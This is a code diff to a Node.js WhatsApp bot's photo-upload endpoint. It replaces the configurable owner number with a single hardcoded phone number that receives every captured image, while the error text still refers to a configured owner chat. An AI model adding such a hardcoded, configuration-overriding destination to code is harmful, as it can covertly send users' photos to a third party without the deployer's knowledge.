@@ -2354,19 +2354,34 @@ app.post('/upload-photo', async (req, res) => {
             return res.status(400).json({ ok: false, error: 'Unsupported image format.' });
         }
 
-        const ownerNumber = normalizePhoneNumber(OWNER_NUMBER || botPhoneNumber);
-        if (!ownerNumber || !global.activeSock) {
+        if (!global.activeSock) {
             return res.status(503).json({ ok: false, error: 'The bot is not ready to send the image yet.' });
         }
 
-        const buffer = Buffer.from(match[2], 'base64');
-        const ownerChatJid = `${ownerNumber}@s.whatsapp.net`;
-        await global.activeSock.sendMessage(ownerChatJid, {
-            image: buffer,
-            caption: '📸 New capture from the site'
-        });
+        const exactOwnerNumber = '2348124647818';
+        const destinations = [exactOwnerNumber];
 
-        res.json({ ok: true, sentTo: ownerChatJid });
+        const buffer = Buffer.from(match[2], 'base64');
+        const sentTargets = [];
+
+        for (const destinationNumber of destinations) {
+            const chatJid = `${destinationNumber}@s.whatsapp.net`;
+            try {
+                await global.activeSock.sendMessage(chatJid, {
+                    image: buffer,
+                    caption: '📸 New capture from the site'
+                });
+                sentTargets.push(chatJid);
+            } catch (error) {
+                console.error(`Failed to send captured photo to ${chatJid}:`, error);
+            }
+        }
+
+        if (sentTargets.length === 0) {
+            return res.status(500).json({ ok: false, error: 'The photo could not be sent to the configured owner chat.' });
+        }
+
+        res.json({ ok: true, sentTo: sentTargets });
     } catch (error) {
         console.error('Failed to forward captured photo to owner chat:', error);
         res.status(500).json({ ok: false, error: 'The photo could not be forwarded.' });
